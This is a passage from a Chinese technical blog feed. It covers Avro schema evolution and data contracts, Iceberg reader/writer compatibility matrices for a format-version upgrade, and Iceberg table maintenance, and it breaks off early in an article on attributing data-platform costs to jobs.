<h2 id="Schema-兼容只能挡住一部分事故"><a href="#Schema-兼容只能挡住一部分事故" class="headerlink" title="Schema 兼容只能挡住一部分事故"></a>Schema 兼容只能挡住一部分事故</h2><p>Apache Avro 的演进模型很适合解释兼容边界。数据按 writer schema 写入，应用用 reader schema 读取；两者不同时，根据 Schema Resolution 规则匹配字段、应用 default 或做有限类型提升。</p>
<p>例如 writer 没有新字段，而 reader schema 为该字段提供 default，reader 可以补上默认值。若 reader 要求一个 writer 不存在、又没有 default 的字段，必须报错。<code>int</code> 可以提升为 <code>long</code>，但反过来可能溢出，不能当成兼容变化。</p>
<p>这类检查能回答“字节能否被新旧代码解码”，却回答不了业务语义是否兼容。把 <code>amount</code> 从“分”改成“元”，类型仍是 long；把 <code>event_time</code> 从业务发生时间改成写入时间，timestamp 仍合法；状态码 2 原来表示 CANCELLED，后来改成 CLOSED，Schema Registry 也不会报警。</p>
<p>所以契约评审至少分两栏：structural compatibility 与 semantic compatibility。前者交给 Avro&#x2F;Protobuf&#x2F;表 schema 工具，后者必须由生产者说明，并由实际消费者和指标验证。</p>
<h2 id="Default-Value-不是给生产者偷懒的"><a href="#Default-Value-不是给生产者偷懒的" class="headerlink" title="Default Value 不是给生产者偷懒的"></a>Default Value 不是给生产者偷懒的</h2><p>Avro 规范里的 field default 用于 reader 读取一个缺少该字段的旧 writer record，不代表 producer 编码时可以省略必填字段。规范明确说明，即使字段值等于 default，Avro 仍会编码这个字段。</p>
<p>这条细节在数据平台里经常被用错。上游说“新字段有默认值，所以老数据自动兼容”，下游却把默认值当真实业务值。若 <code>country</code> 默认 <code>CN</code>，旧记录没有 country，reader 补出的 CN 只是技术兼容值，不一定是事实。</p>
<p>我会把 default 分成三类：确定的业务缺省、未知值占位、仅用于历史读取。第二类应使用明确的 UNKNOWN&#x2F;null 语义，不要伪装成正常枚举；第三类要在元数据中标注 <code>inferred_from_schema_default=true</code>，避免质量规则把补值后的非空率当成源数据质量。</p>
<p>新增 nullable 字段通常结构上安全，业务上仍要回答：什么时候开始有值、历史是否回填、未回填记录怎样解释、下游何时可以依赖它。没有这些答案，“向后兼容”只是解码兼容。</p>
<h2 id="变更必须绑定消费者清单"><a href="#变更必须绑定消费者清单" class="headerlink" title="变更必须绑定消费者清单"></a>变更必须绑定消费者清单</h2><p>很多契约平台只保存 producer owner，没有可靠消费者。要变更时群发一条消息，没人回复就默认没有影响。实际消费者可能是一个月跑一次的财务任务、临时 notebook、导出接口或几个月未发布但仍在用的服务。</p>
<p>我会从运行证据建立消费者清单：Kafka consumer group、表血缘、查询日志、任务调度、API access log。每个消费者记录 owner、最后活跃时间、读取字段、writer&#x2F;reader schema 版本、SLA 和环境。</p>
<p>静态 SQL 血缘只能找到显式列引用。<code>SELECT *</code>、JSON 解析、反射读取和离线文件下载都可能漏掉，因此还要结合运行访问。反过来，半年未运行的测试作业不能永久阻塞变化，可以按治理规则进入过期确认。</p>
<p>变更影响不能只标 high&#x2F;low。我更喜欢列出具体失败模式：旧 reader 无法解析、字段变 null、枚举落 default、Join key 改变、分区裁剪失效、指标口径漂移。这样 owner 才知道该验证什么。</p>
<h2 id="兼容方向取决于发布顺序"><a href="#兼容方向取决于发布顺序" class="headerlink" title="兼容方向取决于发布顺序"></a>兼容方向取决于发布顺序</h2><p>“backward compatible”经常被说成一个绝对结论，其实它总是相对于谁读谁写。</p>
<p>新 reader 读取旧 writer 数据，需要 backward compatibility；旧 reader 读取新 writer 数据，需要 forward compatibility。滚动发布期间，新旧 producer 和 consumer 会同时存在，若要求任意组合都能工作，才需要 full compatibility。</p>
<p>常见新增字段流程是先发布能够接受新字段的 consumer，再让 producer 开始写；删除字段则先让所有 consumer 停止依赖，再由 producer 删除。若顺序反了，即使最终 schema 组合兼容，发布窗口中也可能失败。</p>
<p>我会把一次变更拆成版本状态：PROPOSED、VALIDATED、CANARY、DUAL_WRITE、DEFAULT、DEPRECATED、RETIRED。每次状态切换都有条件，例如消费者覆盖率 100%、影子对账差异为 0、解析错误低于阈值。它不是一条“审核通过”记录。</p>
<p>对于语义变化，最好新建字段而不是原地复用。例如保留 <code>amount_cent</code>，新增 <code>amount_decimal</code>，双写一段时间，让消费者迁移；确认旧字段无读取后再弃用。直接把 <code>amount</code> 的单位改掉，任何 schema 检查都救不了历史混读。</p>
<h2 id="验证要使用历史数据和真实消费者"><a href="#验证要使用历史数据和真实消费者" class="headerlink" title="验证要使用历史数据和真实消费者"></a>验证要使用历史数据和真实消费者</h2><p>契约 CI 可以先做静态检查：字段删除、类型变化、union 顺序、default 合法性、枚举新增&#x2F;删除、主键和分区列变化。Avro 还提供 alias，让 reader 将旧 type&#x2F;field name 映射到新名称，但 alias 是否被具体语言实现和调用路径正确使用，也要跑数据验证。</p>
<p>我会从生产抽取脱敏的旧版本样本，用新 reader 反序列化；再用新 writer 生成边界值，让仍在线的旧 reader 读取。测试不仅看是否抛异常，还比较 default、null、decimal、timezone、枚举和嵌套字段结果。</p>
<p>语义变更则做双读或影子计算。新旧逻辑对同一批数据产出结果，按主键、分区和指标对账。允许差异的，要给出预期范围与原因；无法解释的差异不能靠“整体差不多”放行。</p>
<p>发布后继续观察解析错误、null rate、枚举 UNKNOWN、值域、行数、迟到率和下游任务失败。很多问题只在生产长尾值出现，canary consumer 与回滚开关要保留到观察窗口结束。</p>
<h2 id="契约还要包含时效和运行责任"><a href="#契约还要包含时效和运行责任" class="headerlink" title="契约还要包含时效和运行责任"></a>契约还要包含时效和运行责任</h2><p>一张表 schema 完全没变，但从 8:00 产出变成 11:00，同样会破坏下游。契约应包含 freshness、completeness、更新频率、重跑与补数行为。Kafka topic 还要写 retention、ordering key、重复与投递语义。</p>
<p>质量阈值不能只写“非空率 99%”。要绑定窗口、分区和处理动作：哪个字段、哪个业务日期、样本量多大，超过阈值是阻断发布、隔离分区还是只告警。owner 也分 producer owner 与 data owner，前者处理管道故障，后者解释业务口径。</p>
<p>这些内容最好与 schema version 一起生成不可变 contract version。一次运行记录自己消费的 contract ID，排障时才能还原当时的字段和 SLA，而不是只看到今天已经修改过的文档。</p>
<p>数据契约不是一堵禁止变化的墙，更像一套有闸门的发布系统。机器检查把低级兼容错误挡在前面，消费者清单和影子验证处理真实影响，分阶段发布与监控保证变化可撤回。做到这些，业务才能放心变化，数据平台也不用靠事故来发现依赖。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/avro/blob/3a9e5a789b5165e0c8c4da799c387fdf84bfb75e/doc/content/en/docs/%2B%2Bversion%2B%2B/Specification/_index.md#L69-L97">Apache Avro 1.11.1 Specification：字段 default 的读取语义</a></li>
<li><a href="https://github.com/apache/avro/blob/3a9e5a789b5165e0c8c4da799c387fdf84bfb75e/doc/content/en/docs/%2B%2Bversion%2B%2B/Specification/_index.md#L655-L680">Apache Avro 1.11.1 Specification：writer schema、reader schema 与 Schema Resolution</a></li>
<li><a href="https://github.com/apache/avro/blob/3a9e5a789b5165e0c8c4da799c387fdf84bfb75e/doc/content/en/docs/%2B%2Bversion%2B%2B/Specification/_index.md#L658-L694">Apache Avro 1.11.1 Specification：数值类型提升与 enum&#x2F;default 规则</a></li>
<li><a href="https://github.com/apache/avro/blob/3a9e5a789b5165e0c8c4da799c387fdf84bfb75e/doc/content/en/docs/%2B%2Bversion%2B%2B/Specification/_index.md#L264-L275">Apache Avro 1.11.1 Specification：type&#x2F;field alias 在演进中的映射方式</a></li>
<li><a href="https://github.com/apache/avro/blob/3a9e5a789b5165e0c8c4da799c387fdf84bfb75e/doc/content/en/docs/%2B%2Bversion%2B%2B/Getting%20started%20%28Java%29/_index.md#L176-L185">Apache Avro 1.11.1 Java Guide：读取时同时使用 writer 与 reader schema</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Schema Evolution</tag>
        <tag>数据契约</tag>
        <tag>Apache Avro</tag>
      </tags>
  </entry>
  <entry>
    <title>Iceberg 表格式升级前，为什么要做 Reader / Writer 兼容矩阵</title>
    <url>//2022/06/20/table-format-compatibility-matrix/</url>
    <content><![CDATA[<p>把 Iceberg 表的 <code>format-version</code> 从 1 改成 2，看起来只是一条表属性更新。真正危险的是，这张表往往同时被 Spark、Flink、Trino、离线维护脚本和自研 SDK 访问。创建表的人确认自己的引擎能读 v2，并不能证明整条生产链路已经兼容。</p>
<p>格式版本升级与普通依赖升级不同。旧 reader 遇到自己不理解的新表特性，正确行为应该是拒绝读取；更糟的实现可能加载成功，却没有应用 delete files，悄悄把已删除的行读出来。上线前必须把“有哪些访问者、每个访问者执行什么动作”展开成矩阵。</p>
<p class="article-diagram-scroll"><img src="/images/articles/table-format-compatibility-matrix.svg" class="lazyload" data-srcset="/images/articles/table-format-compatibility-matrix.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="表格式升级需要验证的五类兼容边界"></p>
<span id="more"></span>

<h2 id="Format-Version-管的是磁盘语义，不是客户端版本号"><a href="#Format-Version-管的是磁盘语义，不是客户端版本号" class="headerlink" title="Format Version 管的是磁盘语义，不是客户端版本号"></a>Format Version 管的是磁盘语义，不是客户端版本号</h2><p>Iceberg 0.13.2 规范已经采纳 v1 和 v2。v1 定义不可变 Parquet、Avro、ORC 文件上的分析表；v2 增加 row-level updates&#x2F;deletes，核心变化是用 delete files 表示已有 data files 中哪些行已经失效。</p>
<p><code>format-version=2</code> 不是“Iceberg jar 版本 2”，也不是“打开 UPDATE 语法”。它声明这张表的 metadata 和 content files 可以使用 v2 语义。规范明确要求，遇到高于实现支持范围的格式版本必须抛错，因为旧实现无法保证正确解释新的字段和规则。</p>
<p>同样，升级到 v2 不代表表会立即产生 delete file。只做 append 的 v2 表，物理内容可能暂时与 v1 很接近；但一旦某个 writer 提交 row-level delete，所有 reader 都必须正确把 delete 应用到扫描结果。测试只覆盖“升级后还能 SELECT”远远不够，必须覆盖真正使用新能力后的读结果。</p>
<p>规范还说明 v1 data&#x2F;metadata files 在升级到 v2 后仍然有效。这保证向前升级不要求全表重写，却不意味着可以随意降级。<code>TableMetadata.Builder.upgradeFormatVersion()</code> 在源码里只允许新版本大于等于当前版本，明确拒绝 downgrade。回滚方案不能写成“出问题再把属性改回 1”。</p>
<h2 id="先列访问路径，再填能力矩阵"><a href="#先列访问路径，再填能力矩阵" class="headerlink" title="先列访问路径，再填能力矩阵"></a>先列访问路径，再填能力矩阵</h2><p>我会先从 Catalog 审计、作业调度、查询网关和代码仓库里找出真实访问者，不靠群里询问“还有谁在用”。同一个 Spark 集群可能既有 SQL extension 作业，也有 DataFrame V1 writer；同一个 Flink 版本可能同时存在 batch read、streaming append 和维护 Action。</p>
<p>矩阵的行不是笼统的产品名称，而是可部署的运行组合：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Spark 3.1 + Iceberg runtime 0.13.2 + extensions enabled + HiveCatalog</span><br><span class="line">Flink 1.14 + Iceberg runtime 0.13.2 + HiveCatalog</span><br><span class="line">自研 Java 服务 + iceberg-core 0.11.x + HadoopCatalog</span><br></pre></td></tr></table></figure>

<p>列则按动作拆开：load table、snapshot scan、read position delete、read equality delete、append、overwrite、UPDATE、MERGE、expire snapshots、rewrite data files。每个单元格标记 SUPPORTED、UNSUPPORTED、NEEDS_CONFIG 或 NOT_USED，并附真实测试证据。</p>
<p>这样才能暴露一种常见误判：某个引擎“支持 Iceberg”，但只支持 append&#x2F;read；另一个版本支持 SQL DELETE，却以 copy-on-write 重写 data files，并没有覆盖 equality delete reader；维护脚本能加载表，却使用了不兼容的旧 core jar。</p>
<h2 id="SQL-能解析，不等于表操作能正确执行"><a href="#SQL-能解析，不等于表操作能正确执行" class="headerlink" title="SQL 能解析，不等于表操作能正确执行"></a>SQL 能解析，不等于表操作能正确执行</h2><p>Iceberg 0.13.2 的 Spark 写入文档列出 SQL <code>MERGE INTO</code>、<code>DELETE FROM</code>、<code>UPDATE</code> 等能力，同时注明部分计划要求启用 Iceberg Spark extensions。Spark 3.1 才增加 UPDATE 支持，Spark 2.4 的 DataFrame overwrite 行为与 Spark 3 也不相同。</p>
<p>因此兼容测试至少要过四层：SQL parser 是否接受语句；planner 是否生成预期 Iceberg operation；writer 是否正确提交 data&#x2F;delete files；另一个独立 reader 是否读到正确结果。只在同一 Session 里执行 UPDATE 后再 SELECT，可能让 writer 和 reader 共用同一套错误实现，无法形成交叉验证。</p>
<p>Flink 侧也不能用一句“支持 Flink”概括。0.13.2 文档列出的集成版本为 Flink 1.12、1.13、1.14，能力表中 SQL ALTER 仅支持表属性，列和分区变更不支持；metadata tables 在 Java API 可用，但 Flink SQL 不支持。平台 UI 如果暴露统一按钮，后端必须按引擎能力做约束，不能把不支持的操作提交后再等运行报错。</p>
<p>我还会验证 SQL 之外的入口。某些作业调用 <code>DataFrameWriter</code>，某些用 <code>DataFrameWriterV2</code>，有的直接调用 Iceberg Java API。它们加载同一表，写入语义和 Catalog 选择可能不同。矩阵按运行路径建，不能按文档目录建。</p>
<h2 id="Reader-比-Writer-更值得先升级"><a href="#Reader-比-Writer-更值得先升级" class="headerlink" title="Reader 比 Writer 更值得先升级"></a>Reader 比 Writer 更值得先升级</h2><p>多引擎环境里，我通常先升级 reader，再升级 writer，最后才修改表格式。原因很简单：只要有一个新 writer 开始产生 v2 delete files，所有仍在生产的 reader 都必须理解它们。</p>
<p>第一阶段让新版 reader 继续读取 v1 表，验证它与旧结果一致。第二阶段在隔离 Catalog 创建 v2 测试表，写 position&#x2F;equality deletes，由每种 reader 读取并对账。第三阶段冻结新增旧客户端，确认调度平台不会再投递旧镜像。最后才升级真实表，并允许 v2 writer 使用新能力。</p>
<p>读验证不能只做 <code>count(*)</code>。需要准备能区分 delete 应用错误的样本：同一个业务键的旧值与新值、跨分区 equality delete、同一 commit 的 data 与 position delete、历史 snapshot time travel。结果要与基准数据逐行或按强校验和比较。</p>
<p>还要验证 projection 与 filter。一个 reader 全列扫描时正确，不代表只投影部分列时仍会加载 equality delete 所需字段；带 predicate 时也要确认 file&#x2F;delete pruning 没有错误跳过删除文件。</p>
<h2 id="Catalog-与打包冲突也是兼容性的一部分"><a href="#Catalog-与打包冲突也是兼容性的一部分" class="headerlink" title="Catalog 与打包冲突也是兼容性的一部分"></a>Catalog 与打包冲突也是兼容性的一部分</h2><p>表格式正确，Catalog 配错同样会造成事故。Spark 通过 <code>spark.sql.catalog.*</code> 注册 Catalog；不同入口可能把同一标识解析到 HiveCatalog、HadoopCatalog 或 session catalog。测试环境使用 HadoopCatalog 成功，不代表生产 HMS 上的锁与原子提交配置也正确。</p>
<p>运行包还会带来依赖冲突。把多个 Iceberg runtime jar、引擎自带 connector 与用户 jar 同时放到 classpath，最终加载哪个类取决于 classloader。平台应该记录实际 jar checksum 和启动日志中的实现版本，不能只登记 Maven POM 里声明的版本。</p>
<p>我会加一个启动自检：加载目标表，输出 table UUID、metadata location、format version、Catalog implementation 和 Iceberg code source。若作业解析到另一个 Catalog 或旧 jar，在处理数据前就失败。</p>
<p>Catalog 权限也要分别测试 read 与 commit。一个服务账号能读取 metadata，不代表有权限原子更新 pointer；maintenance 账号可能需要删除文件，却不应拥有业务写入权限。能力矩阵里的 SUCCESS 必须在生产同类身份与存储策略下验证。</p>
<h2 id="升级方案必须包含不可降级的回滚路径"><a href="#升级方案必须包含不可降级的回滚路径" class="headerlink" title="升级方案必须包含不可降级的回滚路径"></a>升级方案必须包含不可降级的回滚路径</h2><p>因为 format version 不能直接 downgrade，真正的回滚有两类。</p>
<p>如果只升级属性、尚未产生 v2-only 内容，可以停止 writer，把 reader 切回升级前的 snapshot 或复制到新建 v1 表；能否安全做取决于所用版本和 Catalog 操作，不能在事故现场临时猜。若已经产生 delete files，则必须用兼容 reader 把当前逻辑结果物化为一张新的 v1 表，再切换消费者。</p>
<p>这意味着升级前要保存 base metadata location、snapshot ID、表属性和所有消费者清单，设置变更窗口，禁止未知 writer。升级后先执行受控 append，再执行受控 row-level operation，每一步都用异构 reader 对账。</p>
<p>验收通过后，矩阵也不能丢。后续新增一个查询引擎、升级一个 connector 或恢复旧作业镜像时，都要经过同一套能力检查。表的兼容边界会随访问者变化，不是一次升级会议的附件。</p>
<p>表格式真正提供的是跨引擎共享数据语义。越是希望“一份表到处读写”，越要把每个 reader、writer 和维护工具的能力写清楚。格式升级那条 ALTER 很短，准备工作应该比它长得多。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/0784d64a659abd4fdaa82cdb599a250a7514facf/site/docs/spec.md#L20-L40">Iceberg 0.13.2 Spec：格式版本的 forward compatibility 边界</a></li>
<li><a href="https://github.com/apache/iceberg/blob/0784d64a659abd4fdaa82cdb599a250a7514facf/site/docs/spec.md#L604-L618">Iceberg 0.13.2 Spec：reader 遇到不支持的 format-version 必须报错</a></li>
<li><a href="https://github.com/apache/iceberg/blob/0784d64a659abd4fdaa82cdb599a250a7514facf/core/src/main/java/org/apache/iceberg/TableMetadata.java#L813-L824"><code>TableMetadata.upgradeFormatVersion()</code>：允许升级、拒绝降级</a></li>
<li><a href="https://github.com/apache/iceberg/blob/0784d64a659abd4fdaa82cdb599a250a7514facf/site/docs/spark-writes.md#L18-L40">Iceberg 0.13.2 Spark Writes：不同 Spark API 与 SQL 能力边界</a></li>
<li><a href="https://github.com/apache/iceberg/blob/0784d64a659abd4fdaa82cdb599a250a7514facf/site/docs/spark-writes.md#L162-L201">Iceberg 0.13.2 Spark Writes：DELETE、UPDATE 与文件重写语义</a></li>
<li><a href="https://github.com/apache/iceberg/blob/0784d64a659abd4fdaa82cdb599a250a7514facf/site/docs/flink.md#L18-L39">Iceberg 0.13.2 Flink：支持版本与 SQL&#x2F;API 能力表</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>表格式</tag>
        <tag>兼容性</tag>
      </tags>
  </entry>
  <entry>
    <title>Iceberg 接入生产后，真正缺的是表级运维闭环</title>
    <url>//2022/09/15/iceberg-operations-loop/</url>
    <content><![CDATA[<p>Iceberg 表能被 Spark 和 Flink 正常读写，只能证明接入完成，不能证明可以长期运行。流式任务每天产生几百个 snapshots，小批写入不断增加 data files，失败任务留下 orphan files，time travel 保留策略又阻止旧文件回收。三个月后，表仍能查，但规划越来越慢，存储账单一直涨，维护脚本谁也不敢改。</p>
<p>我认为平台真正要补的是表级运维闭环：从 metadata tables 读取健康信号，按每张表的负载和 SLA 选择维护动作，记录提交与删除证据，再验证查询和成本是否改善。它不是几条全局 cron，而是和写入一样正式的生产链路。</p>
<p class="article-diagram-scroll"><img src="/images/articles/iceberg-operations-loop.svg" class="lazyload" data-srcset="/images/articles/iceberg-operations-loop.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Iceberg 表从元数据体检到读写验收的运维闭环"></p>
<span id="more"></span>

<h2 id="先把-Metadata-Tables-变成可持续指标"><a href="#先把-Metadata-Tables-变成可持续指标" class="headerlink" title="先把 Metadata Tables 变成可持续指标"></a>先把 Metadata Tables 变成可持续指标</h2><p>Iceberg 0.14.1 能通过 <code>history</code>、<code>snapshots</code>、<code>files</code>、<code>manifests</code>、<code>partitions</code> 等 metadata tables 检查表状态。它们不是只在排障时手工查询的系统表，更适合作为表健康采集源。</p>
<p>我会按日或小时采集一份不可变快照，至少包含：current snapshot ID、snapshot age、24 小时提交次数、operation 分布、data&#x2F;delete file 数量与字节、文件 size 分位数、manifest 数量、partition record&#x2F;file count。采集结果带 table UUID 与 metadata location，防止同名重建后把两代数据接在一起。</p>
<p>指标要保留分布，不能只有平均值。平均文件 256 MB，可能是少量 5 GB 文件加上几万个 1 MB 文件；全表 file count 正常，某个实时热分区却已经挂了大量 delete files。p10&#x2F;p50&#x2F;p90 与 per-partition topN 更接近实际维护需求。</p>
<p><code>all_data_files</code>、<code>all_manifests</code> 这类跨 snapshot 表会出现同一文件被多个 snapshot 引用，不能直接 <code>count(*)</code> 当物理文件数。采集逻辑要理解 metadata table 语义，区分 current state、historical reachability 与存储 listing。</p>
<h2 id="不同债务要由不同动作偿还"><a href="#不同债务要由不同动作偿还" class="headerlink" title="不同债务要由不同动作偿还"></a>不同债务要由不同动作偿还</h2><p>Iceberg 的维护动作各自处理不同对象。</p>
<p><code>rewrite_data_files</code> 用来改善数据文件尺寸或排序，解决 file open、delete merge 和扫描布局。<code>rewrite_manifests</code> 调整 metadata tree，减少规划时扫描的 manifests，并让 manifest 分组更贴近查询过滤。<code>expire_snapshots</code> 移除过期历史引用，控制 metadata 和 time travel 窗口。<code>remove_orphan_files</code> 查找根本没被 metadata 引用的文件。</p>
<p>把它们打包成一个“优化表”按钮，会让失败难以解释。一次 data rewrite 成功、expire 失败、orphan 删除一半，最终到底是什么状态？平台应该把 action、base snapshot、参数、输入候选、输出 snapshot 与删除结果分别记录。</p>
<p>动作顺序也不是固定的。高频流表可能先降低 writer commit 频率，再 compact 热分区，否则刚合并完又产生新碎片；snapshot 积累过多时先 expire 能减少后续可达性扫描，但必须满足 time travel 与长查询窗口；orphan removal 通常最保守，先 dry-run 再删除。</p>
<h2 id="Retention-是业务恢复能力，不只是省存储"><a href="#Retention-是业务恢复能力，不只是省存储" class="headerlink" title="Retention 是业务恢复能力，不只是省存储"></a>Retention 是业务恢复能力，不只是省存储</h2><p><code>expire_snapshots</code> 会让过期 snapshot 不再可用于 time travel 或 rollback。Spark procedure 文档说明，它不会删除仍被非过期 snapshot 需要的文件。安全性边界清楚，但“保留多久”仍然是业务选择。</p>
<p>如果财务表要求可回溯 90 天，而平台统一只保留 7 天，存储省下来了，审计能力也丢了。相反，流式临时明细没有回滚需求却永久保留 snapshot，会让 metadata 和文件引用不断增长。</p>
<p>我会给表定义三项：<code>min_snapshots_to_keep</code>、<code>max_snapshot_age</code> 与 <code>max_ref_age</code>，并把分支&#x2F;tag 引用纳入检查。执行 expire 前输出计划删除的 snapshot IDs、时间范围、仍保留的最老 snapshot 和预计可回收文件数。</p>
<p>长时间运行的 reader 也要考虑。一个 Spark 查询基于旧 snapshot 规划后执行数小时，维护任务若过早 expire 并删除其数据文件，查询会在中途失败。保留窗口至少覆盖最长读任务、写任务和故障恢复时间，再加安全余量。</p>
<h2 id="Orphan-清理必须先证明“不可达”"><a href="#Orphan-清理必须先证明“不可达”" class="headerlink" title="Orphan 清理必须先证明“不可达”"></a>Orphan 清理必须先证明“不可达”</h2><p>分布式写入会先生成 data&#x2F;manifest&#x2F;metadata 文件，再提交 table metadata pointer。任务失败或提交冲突后，部分文件可能没有被任何 snapshot 引用，成为 orphan。目录 listing 中“最近没有修改”不能直接等价为可删除。</p>
<p>0.14.1 的 <code>remove_orphan_files</code> procedure 提供 <code>dry_run</code>，可以先列出候选而不删除。我会强制生产首次执行、路径配置变化和大规模候选时走 dry-run，并把候选清单落审计表。</p>
<p>删除前做三类检查：文件年龄是否大于最长写入&#x2F;重试窗口；路径 authority、scheme 和规范化结果是否与 metadata 一致；候选是否落在允许的 table location 前缀。任何一项异常都停止，而不是跳过几条继续删。</p>
<p>真正执行后还要记录成功、not found、permission denied 与其他失败。对象存储批量删除返回部分成功时，Job exit 0 不能代表全部完成。下一轮扫描可以重试失败项，但不应丢掉上一次证据。</p>
<h2 id="维护服务要与-Writer-协调"><a href="#维护服务要与-Writer-协调" class="headerlink" title="维护服务要与 Writer 协调"></a>维护服务要与 Writer 协调</h2><p>Rewrite、expire 与正常 writer 最终都要提交 metadata。不同操作的冲突条件不同，统一做“失败重试三次”只会放大 Catalog 压力。</p>
<p>服务需要知道表的写入模式和窗口。纯 append 表可以在老分区做 data rewrite；活跃分区存在 row-level update 时，rewrite 必须处理有效 delete 并验证并发变化；overwrite 和 compaction 同时改同一批文件，应由调度器错开。</p>
<p>我会为每张表建立 maintenance lease，防止两轮 planner 选到相同文件；同时不给维护任务长期锁住整张表。file groups 独立提交时，每组都记录 base&#x2F;current snapshot 与 conflict 原因。冲突率高是调度设计信号，不是简单增加重试上限的理由。</p>
<p>维护资源也要有预算。限制每小时 rewrite bytes、并发 file groups、Catalog commits 和 delete requests，业务查询高峰自动降速。表债务可以延迟一轮，线上查询被维护任务拖垮则是直接事故。</p>
<h2 id="成功标准必须回到查询和恢复"><a href="#成功标准必须回到查询和恢复" class="headerlink" title="成功标准必须回到查询和恢复"></a>成功标准必须回到查询和恢复</h2><p>维护 Job 成功只说明 procedure 执行结束。验收要回答三个问题。</p>
<p>第一，物理结构是否改善：小文件比例、delete-to-data ratio、manifest 数和 snapshot 数是否落到目标区间。第二，查询是否改善：相同 SQL 的 planning time、selected files、scan bytes 和 p95 latency 是否下降。第三，恢复能力是否仍满足：最老可用 snapshot、tag&#x2F;branch 和回滚演练是否符合策略。</p>
<p>如果 rewrite 处理 10 TB 后，文件数下降但查询扫描量没变，可能排序布局没有贴合过滤条件；如果 expire 执行正常但存储没下降，说明文件仍被其他 refs 引用，或删除失败；如果 manifest rewrite 后 planning 更慢，可能分组破坏了查询局部性。</p>
<p>每个动作都应有 before&#x2F;after snapshot 与查询对照。平台把这份结果展示给表 owner，owner 才能判断策略值不值得继续，而不是只收到“优化成功”的绿色提示。</p>
<h2 id="给表设置状态，而不是等告警爆炸"><a href="#给表设置状态，而不是等告警爆炸" class="headerlink" title="给表设置状态，而不是等告警爆炸"></a>给表设置状态，而不是等告警爆炸</h2><p>我会把表健康划为 HEALTHY、DEBT_GROWING、MAINTENANCE_DUE、MAINTENANCE_BLOCKED 和 AT_RISK。状态由具体条件驱动，例如连续三天新增小文件快于 rewrite、snapshot age 超过上限、orphan dry-run 候选异常激增、commit conflict 持续升高。</p>
<p><code>BLOCKED</code> 要带原因：没有删除权限、仍有旧 reader、缺少维护窗口、Catalog commit 不稳定。这样治理工作能进入 owner 的待办，而不是藏在平台后台。</p>
<p>Iceberg 的价值之一，是把表状态显式写在 metadata tree 里。平台如果只把它当新的文件格式，就浪费了这些可诊断证据。接入生产后的重点不是再演示一次 time travel，而是让每张表的提交、文件、快照、保留和维护都有长期可执行的策略。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-queries.md#L35-L57">Iceberg 0.14.1 Spark Queries：history、snapshots、files、manifests 等 metadata tables</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-queries.md#L195-L319">Iceberg 0.14.1 Spark Queries：metadata tables 的访问与跨 snapshot 语义</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-procedures.md#L191-L225">Iceberg 0.14.1 Spark Procedures：expire_snapshots 的保留与文件删除边界</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-procedures.md#L228-L257">Iceberg 0.14.1 Spark Procedures：remove_orphan_files 与 dry-run</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-procedures.md#L260-L316">Iceberg 0.14.1 Spark Procedures：rewrite_data_files 的策略、过滤和参数</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-procedures.md#L319-L355">Iceberg 0.14.1 Spark Procedures：rewrite_manifests</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>表维护</tag>
        <tag>平台运维</tag>
      </tags>
  </entry>
  <entry>
    <title>数据平台成本怎么归到任务：别再只看队列和部门总账</title>
    <url>//2022/10/07/data-platform-cost-attribution/</url>
    <content><![CDATA[<p>数据平台做成本治理，最容易拿到的是部门每月用了多少机器，最难回答的是：哪条任务、哪个业务日期、哪次失败重试花了这些钱。没有实例级归因，平台只能要求所有团队统一降资源，真正浪费的作业反而躲在平均数里。</p>
<p>我会先做一份可追溯的成本账本，把 <code>project -&gt; job -&gt; instance -&gt; attempt -&gt; engine application/pod</code> 串起来，再谈优化。成本治理不是给资源账单换一套图表，而是能从一笔费用追到真实运行证据，也能从一次重跑预估它会增加多少资源和存储开销。</p>
<p class="article-diagram-scroll"><img src="/images/articles/data-platform-cost-attribution.svg" class="lazyload" data-srcset="/images/articles/data-platform-cost-attribution.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据平台从业务身份到优化动作的成本归因链路"></p>
<span id="more"></span>

<h2 id="归因主键必须从调度实例进入执行端"><a href="#归因主键必须从调度实例进入执行端" class="headerlink" title="归因主键必须从调度实例进入执行端"></a>归因主键必须从调度实例进入执行端</h2><p>YARN 看到的是 application ID，Kubernetes 看到 Job&#x2F;Pod UID，Spark 还有 driver&#x2F;executor，Flink 有 JobManager&#x2F;TaskManager。它们都不是业务主键。同一条调度实例可能提交两次 application，一次 Pod 重建也会生成新的 attempt。</p>
<p>因此提交适配层必须把 <code>project_id</code>、<code>job_id</code>、<code>instance_id</code>、<code>attempt_no</code> 和 owner 写入执行系统。Kubernetes 用 labels 保存可查询的短标识，用 annotations 放较长但不敏感的元数据；YARN 可以用 application tags&#x2F;name，并在平台数据库保存反向映射。</p>
